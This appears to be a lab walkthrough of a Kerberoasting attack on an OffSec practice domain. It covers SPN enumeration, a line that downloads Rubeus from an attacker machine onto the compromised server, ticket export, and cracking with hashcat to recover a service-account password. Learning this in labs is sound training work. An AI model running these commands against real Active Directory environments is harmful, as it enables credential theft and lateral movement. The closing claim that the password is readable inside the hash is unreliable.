A **Kerberoasting attack** is one of the most effective ways to extract cleartext passwords for Active Directory service accounts from a compromised machine inside the domain.

Since you have already achieved Remote Code Execution (RCE) on the target Windows domain controller / server, you are in an ideal position to execute this attack.

## Phase 1: Understanding the Concept

Every Active Directory service account (like a SQL service, IIS service, or custom application running under a domain user account) has a **Service Principal Name (SPN)** registered.

- Any authenticated domain user can request a Kerberos service ticket (TGS-Ticket) for _any_ SPN in the domain.
    
- The TGS-ticket is encrypted using the password hash (NTLM or AES) of that specific service account.
    
- **The Vulnerability:** You *do not need administrative privileges* to request these tickets. *Once you have a valid domain user account (or a foothold inside the domain)*, you can request the ticket, export it to your attacker machine, and crack it offline using a GPU to recover the account's plaintext password.

## Phase 2: Enumerating SPNs

Before requesting tickets, you need to find which accounts have SPNs registered.

```d
powershell -Command "setspn -Q */*"
```

Based on the enumeration output and SPN query results, the accounts that have registered Service Principal Names (SPNs) are:

- The Domain Controller / Computer Account (`SERVER`): Multiple standard computer service principal names are registered under `CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec`, including:
    
    TXT
    
    - `HOST/SERVER.access.offsec`
        
    - `ldap/SERVER.access.offsec`
        
        TXT
        
    - `DNS/SERVER.access.offsec`
        
        TXT
        
    - `GC/SERVER.access.offsec/access.offsec`
        
        TXT
        
    - `RestrictedKrbHost/SERVER.access.offsec`
        
        TXT
        
    - `RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec`

- **The KRBTGT Account:** Contains the default ticket-granting service principal name:
    
    - `kadmin/changepw` (under `CN=krbtgt,CN=Users,DC=access,DC=offsec`)
    
- **The MSSQL Service User Account:** Contains a custom application service principal name:
    
    - `MSSQLSvc/DC.access.offsec` (under `CN=MSSQL,CN=Users,DC=access,DC=offsec`)



> [!Info]
> Out of these, the `MSSQL` user account (`MSSQLSvc/DC.access.offsec`) is the primary user-mapped service account target for a Kerberoasting attack because cracking its service ticket will yield the plaintext password of a domain user account

## Phase 3: Requesting and Exporting Tickets

If you are executing commands locally via your Windows web shell wrapper, you can use PowerShell to request and export the Kerberos tickets into a format that `Hashcat` or `John the Ripper` can crack.

### Requesting the TGS Tickets via Rubeus

- On your ATTACKING MACHINE open a python http server in the directory where Rubeus.exe is.
```bash
python3 -m http.server 80	
```

- On the TARGET MACHINE shell run the following command to download Rubeus.exe.
```d
powershell -Command "Invoke-WebRequest -Uri 'http://<ATTACKING MACHINE IP>/Rubeus.exe' -OutFile 'C:\Windows\Tasks\rubeus.exe'"
```

- Export the Kerberos tickets.
```d
C:\Windows\Tasks\Rubeus.exe kerberoast /outfile:hashes.txt	
```

## Phase 4: Offline Brute-Forcing (Cracking the Hash)

Once you successfully extract the ticket hash (which looks like `$krb5tgs$23$*...`), bring it back to your attacker machine and crack it using **Hashcat** (Mode `13100` for Kerberos 5 TGS-REP etype 23):

1. On your browser go to http://TARGET_MACHINE/uploads/hashes.txt
	![[hashes.png]]
2. Copy the hash and paste it on your own machine.
3. Crack it with Hashcat.
```bash
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
	
![[hashcat.png]]
4.  Open the cracked.txt file.
```bash
cat cracked.txt
```

![[cracked.png]]This Kerberos ticket hash belongs to the `svc_mssql` domain user account on the `access.offsec` domain.

You can see this directly inside the hash structure:

- **Account:** `svc_mssql`
- Password: `trustno1`
- **Domain:** `access.offsec`
- **Target SPN:** `MSSQLSvc/DC.access.offsec`

Once you crack this hash using Hashcat, you will recover the plaintext password for the `svc_mssql` service account, giving you valid domain credentials to continue your lateral movement or access the database services!
